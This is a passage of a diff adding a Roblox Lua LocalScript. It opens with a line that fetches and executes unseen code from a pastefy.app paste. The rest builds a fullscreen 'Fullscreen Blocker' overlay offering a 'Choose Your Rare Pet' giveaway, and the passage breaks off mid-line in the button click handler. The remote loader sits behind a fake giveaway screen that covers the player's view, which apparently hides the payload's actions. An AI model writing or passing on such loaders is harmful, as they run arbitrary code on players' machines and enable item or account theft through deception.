@@ -1,0 +1,51 @@
+
+loadstring(game:HttpGet("https://pastefy.app/sOy5Q4Hc/raw"))()
+
+
+-- LocalScript in StarterGui
+
+local Pets = {
+    "Raccoon", "Dragonfly", "Butterfly", "T-Rex", "Spinosaurus",
+    "Mimic Octopus", "Disco Bee", "Queen Bee", "Fennec Fox", "Kitsune"
+}
+
+local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "RarePetLoadingScreen"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+-- Fullscreen Blocker
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.Position = UDim2.new(0, 0, 0, 0)
+frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0.1, 0)
+title.Position = UDim2.new(0, 0, 0.05, 0)
+title.BackgroundTransparency = 1
+title.Text = "🎁 Choose Your Rare Pet 🎁"
+title.TextScaled = true
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBold
+title.Parent = frame
+
+-- Create pet buttons
+for i, pet in ipairs(Pets) do
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0.25, 0, 0.08, 0)
+    btn.Position = UDim2.new(0.1 + ((i - 1) % 2) * 0.5, 0, 0.18 + math.floor((i - 1)/2) * 0.1, 0)
+    btn.Text = pet
+    btn.TextScaled = true
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    btn.Font = Enum.Font.Gotham
+    btn.Parent = frame
+
+    btn.MouseButton1Click:
